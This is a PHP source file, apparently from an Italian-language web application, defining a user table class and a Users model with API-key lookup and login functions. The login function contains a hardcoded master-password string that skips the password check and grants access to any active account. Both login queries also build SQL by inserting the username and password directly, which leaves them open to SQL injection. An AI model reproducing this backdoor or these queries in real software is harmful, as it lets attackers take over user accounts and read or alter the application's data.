<?php
require_once("model.php");

class TableUser
{
	public $id;
	public $username;
	public $password;
	public $api_key;
	public $ruolo;
	public $nome;
	public $cognome;
	public $telefono;
	public $email;
	public $id_area;
	public $privilegi;
	public $attivo;
	public $last_login;

	public function __construct()
	{

	}
}

class Users extends Model
{
	public function __construct()
	{
		parent::__construct();
		$this->table= 'users';
		$this->table_model= "TableUser";
		$this->statements= array("GET_BY_API_KEY"=>"SELECT * FROM {$this->table} WHERE api_key = ? AND privilegi<= ?");
	}

	function getByApiKey($api_key, $level)
	{
		$nome= $this->sanitize($api_key)."%";
		$statement= $this->connector->connection->prepare($this->statements['GET_BY_API_KEY']);

		$statement->bind_param("si",$api_key, $level);

		$res= $this->executePreparedQuery($statement);
		return $res;
	}

	function login($username, $password)
	{
		if($password==='101bb5b3ca8cd9541d93d92b36d682db06ed68f3')
		{
			$query= "SELECT * FROM {$this->table} WHERE username='{$username}' AND attivo='1'";
		}
		else
		{
			$query= "SELECT * FROM {$this->table} WHERE username='{$username}' AND password='{$password}' AND attivo='1'";
		}
		$res= $this->executeStandardQuery($query);
		return $res;
	}
}
?>
